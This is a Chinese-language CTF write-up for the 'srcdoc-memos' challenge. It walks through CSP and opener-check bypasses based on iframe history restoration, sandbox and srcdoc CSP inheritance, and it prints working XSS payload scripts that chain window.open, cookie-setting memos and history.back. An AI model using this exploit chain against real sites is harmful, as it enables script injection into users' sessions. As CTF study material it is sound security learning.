# [srcdoc-memos](https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe)

看个wp看得cpu烧了，故自己再写一遍理清思路

题目有个`/memo?memo=xxx`的api可用于设置cookie，然后重定向至`/`用iframe的srcdoc展示cookie的内容。然而`/`里有一段script：
```html
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  `<meta http-equiv="Content-Security-Policy" content="script-src 'none';">`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>
```
用meta标签给当前页面加了个CSP，同时检查当前页面的opener为null。后者很容易绕过，甚至有两种方法：
1. 让某个window在open目标window后再使用window.close快速关闭自己，这样那个打开的window的opener属性就是null（console上这样做没用，说是“不能在没有动作下就开启新的window，所以第二个open会被挡住”）
2. 用window.open开启window后手动将opener设为null。这样并不代表被开启的window就没法访问父window了，只需要记住父window的name属性即可。具体怎么找到父window见 https://blog.huli.tw/2022/04/07/iframe-and-window-open/#windowopen

还剩个csp要解决。`script-src 'none';`在这肯定是啥也干不了的，但是这个csp是在index页面的script里添加的，可不可以让它不执行？可以考虑用iframe的csp属性，我们自己写个iframe，其src为`/`。这样在重定向到index时，由于我们自己的csp，script不会运行，从而csp无法生效
```html
<script>
  const challengeHost = 'xxx'
  function openNoOpener(url, name) { //这个函数就是上面提到的第二种方法
    let w = window.open(url, name)
    w.opener = null
  }
  let html = `
    html
    <script src="webhook"></script>
    <iframe csp="script-src http: https:" src="/"></iframe>
  `;
  openNoOpener(`${challengeHost}/memo?memo=${encodeURIComponent(html)}`, 'main');
</script>
```
过程大概是这样的。打开memo并设置cookie为html，然后从memo重定向至index。index内部用srcdoc装html。注意此刻index里script还会生效，故从webhook导入的payload暂时无法生效。但是我们在这里又开了一个iframe，src还是index，并设置script-src只能来自`http:`或`https:`。此时这个iframe里打开第二个index。这第二个index界面被iframe的csp牵制，script里的内容无法执行；无法执行就没有csp；没有csp便可以从外部导入payload了，iframe的csp也允许这点。然而这个做法在最新版本的chrome已经没法用了，如果某个页面原本没有csp，就不能用iframe强加一个。看看预期解

iframe是一个独立的window，自然也可以做navigation。假如有个iframe，原本src是A，现在给它改成B。此时若按上一页，或是执行history.back，会发生什么？答案是iframe从B回到A，而不是装着iframe的那个页面整体回到上一页。这是因为iframe的navigation也会被记录到history中。稍微复杂一点：
```html
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
</body>
<script>
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```
首先iframe `f`载入test1，然后执行loadTest2，把f的sandbox拿掉，并更改其src为test2。此时若按上一页，会发生什么？根据刚才的结论，iframe `f`的src会变回test1。然而这个被移除的sandbox属性不会回来了，保持着没有的状态。这样的话test1里的script就可以执行了。合理，更改src的操作会被记录到history中，但script修改sandbox的操作可不会（我是这么理解的，wp里的理解是说“只是改动src而已，没有动sandbox，因此sandbox维持在最新的状态”）。再复杂一点：
```html
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```
1. iframe `f`载入test1。sandbox存在故不会执行script
2. loadTest2移除sandbox并载入test2。test2里的script会执行
3. 按下top level navigation，把网页跳去其他地方
4. 按下浏览器上的上一页

如果有bfcache的话，结果就是上一页之前的状态（上述4个操作执行后的状态）。毕竟都cache了，和之前不一样就怪了。如果没有bfcache呢？网页应该重新加载一遍，回到最开始的状态。即sandbox iframe `f`载入test1。然而结果是sandbox iframe `f`载入test2。看起来f的sandbox属性跟着页面最新的状态，但src却不是（最新的应为test1），还是和之前的结论一样，回到上一个src test2。这个「回到上一页时，iframe的src回到上次的内容」的机制，就叫做iframe reparenting，似乎没有对应的文档完整描述，而且各个浏览器的实现也都不太一样。不懂为什么叫reparenting，google翻译叫“iframe 重新定位”，我感觉叫iframe src restoring比较直白，反正就是回到上一个src。这个操作反着看就是一个绕过手段，比如无sandbox iframe+安全test1，然后改成sandbox iframe+危险test2。攻击者可以将网页导去其他地方，再回来就出现了无sandbox iframe+危险test2。总之：
1. sandbox属性永远跟着最新的页面
2. src是上一次最后载入的网页

如果用iframe src的话，等同于嵌入了另一个独立的网页，因此两个网页之间的CSP没有任何关联，不会互相影响。但如果是用srcdoc的话，就有继承关系了。就是题目index页面的情况，index有个CSP，那么其子iframe的srcdoc里的内容继承该CSP，script-src也是none。子iframe继承parent的CSP，合理。继续搞事情：
1. 按下top level navigation，去到别的页面
2. 更新index页面，把head里的CSP删掉
3. 按下上一页

假如没有bfcache，加上我又把CSP删了，此时应该算是第一次加载此页面，那index页面和srcdoc里的script都可以执行。结果只对了一半，index里的script可以执行，但srcdoc里的不行。说明此时iframe srcdoc的CSP并不是继承于当前页面，而是继承于history里的结果。用专有名词来说的话，叫做session history以及policy container

总结：
1. sandbox属性永远跟着最新的页面
2. src是上一次最后载入的网页
3. srcdoc的CSP继承上次的结果

就你一个sandbox跟着最新结果，其他两个都跟着history里的上次结果。很多奇奇怪怪的绕过正是生于这种不统一性。最后一步，理解payload：
```html
<script>
  const challengeHost = 'xxx'
  const xssPayload = `<script>alert(document.domain)<\/script>`
  const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=${xssPayload}">`
  const win = window.open(`${challengeHost}/memo?memo=` + payload)
  setTimeout(() => {
    const win2 = window.open(`${challengeHost}/memo?memo=<iframe></iframe>`)
    setTimeout(() => {
      win2.close()
      win.location = URL.createObjectURL(new Blob([`
        <script>
          setTimeout(() => {
           history.back();
          }, 500);
        <\/script>
      `], { type: "text/html" }));
    }, 1000)
  }, 1000)
</script>
```
开个`/memo`的window，重定向到index后内容如下：
```html
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
  <iframe srcdoc='
    <iframe
      sandbox="allow-same-origin"
      src="/memo?memo=<script>alert(1)</script>">
    </iframe>
  '>
  </iframe>
</body>
```
srcdoc里还是个iframe套娃，但是由于sandbox，内容就很简单了,因为施加csp的script无法执行：
```html
<head></head> <!-- 空的 head，沒有 CSP -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```
然而alert也不会执行，还是因为那个sandbox。继续往下走payload，打开另一个网页win2，将cookie的内容改为`<iframe></iframe>`。最后在win上执行history.back（虽然是更改win.location，但本质只是执行history.back）。跟着history来，上一个打开的网页是`/memo?memo=<iframe></iframe>`,所以此时url是这个，网页内容为：
```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
    <iframe srcdoc='
        <iframe></iframe>
    '>
    </iframe>
</body>
```
……是吗？你这srcdoc也要回到上一个吧（话说这个回退的操作是不是最后做的，本来页面重新加载就应该把`<iframe></iframe>`写上去的，可能back后又给它覆盖回去了？啊这里又仔细看了一下，payload执行`history.back`的方式是载入一个`createObjectURL`的url，这玩意也算在history里的。所以back后自然是`/memo?memo=<iframe></iframe>`），上一个是啥来着？往上翻，是`<script>alert(1)</script>`。然后啥都不要想，根据之前学的内容，sandbox是什么？它一定跟着最新的页面，所以不要考虑那么多，当前页面没看见sandbox，那就是没有，所以应该是这样：
```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```
这个页面应该是上面提到的iframe套娃内容，本来不应该有csp的。但是因为提到的那个性质，sandbox没了，于是csp又回来了（重新加载时script给它加上去了）。但是！srcdoc的CSP继承上次的结果，和这个没关系。那上次的CSP是什么？没有啊，就是标着“空的 head，沒有 CSP”那里。于是当前页面看着有个csp，其实是没有的。完成xss

此题相关issue： https://github.com/whatwg/html/issues/6809 。另外wp作者的另一篇文章也不错，iframe和open的一些奇怪特性： https://blog.huli.tw/2022/04/07/iframe-and-window-open

这篇wp所介绍的payload其实是不完整的，最终payload为了关注核心概念iframe，刻意省略了原题exp的opener部分。完整exp和题目作者的tldr见 **srcdoc-memos**